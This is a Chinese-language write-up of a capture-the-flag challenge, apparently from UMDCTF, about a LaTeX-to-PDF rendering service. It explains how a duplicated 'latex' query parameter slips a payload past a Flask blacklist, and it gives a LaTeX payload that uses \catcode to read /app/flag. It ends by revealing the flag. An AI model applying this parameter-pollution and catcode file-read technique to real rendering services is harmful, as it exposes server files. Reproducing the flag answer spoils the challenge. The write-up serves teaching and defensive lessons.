# Homework Render

## 题目简述

题目接收 Base64 编码的 LaTeX 文档并返回 `pdflatex` 生成的 PDF。请求先经过 Flask 前端，再转发给 Django 渲染端；两层都有黑名单，但它们对同名查询参数的取值方式不同，而且后端遗漏了 `\catcode` 与 `\def`。

目标是同时利用 HTTP 参数污染和 TeX 类别码，在禁用 shell escape 的情况下读取容器中的 `/app/flag`。

## 解题过程

先看两层取参数的差异：

- Flask 使用 `request.args.get('latex')`，对重复参数取第一个值，并只检查这个值；
- Flask 转发时调用 `request.args.to_dict(flat=False)`，因此重复参数不会消失；
- Django 使用 `request.GET.get('latex')`，对重复参数取最后一个值，并实际渲染它。

因此请求应包含两个 `latex`：

```text
/render?latex=<安全文档的 Base64>&latex=<恶意文档的 Base64>
```

第一个参数只需放普通 LaTeX，让 Flask 黑名单通过。第二个参数会到达 Django。访问 `/robots.txt` 可得到：

```text
User-agent: *
Disallow: /app/flag
```

Django 黑名单拦截字面量 `\input`，却允许 `\catcode`。可以把 `@` 的类别码设为 0，使它成为新的转义字符；这样源码中写的是 `@input`，TeX 解析后却会执行原本的 `\input`：

```tex
\documentclass{article}
\begin{document}
\catcode`@=0
@input{/app/flag}
\end{document}
```

分别对安全文档和上述文档做 Base64 编码，再按原顺序发送两个同名参数。前端看到第一份，后端渲染第二份，返回的 PDF 中出现：

```text
UMDCTF{M4th_iS_H4rd_bUt_LaT3X_1s_H4rd3r}
```

## 方法总结

- 决定性漏洞不是单独的 LaTeX 注入，而是两层框架对重复参数采用不同取值语义。
- 代理、框架和后端之间若没有把多值参数规范化，前置校验就可能检查一份数据、后端使用另一份数据。
- TeX 的类别码能够改变后续字符的词法含义；黑名单只匹配命令的字面写法，无法覆盖这种重构方式。
- `/app/flag` 来自 `robots.txt`，无需猜测容器路径；`-no-shell-escape` 也不能阻止 TeX 自身的文件读取原语。
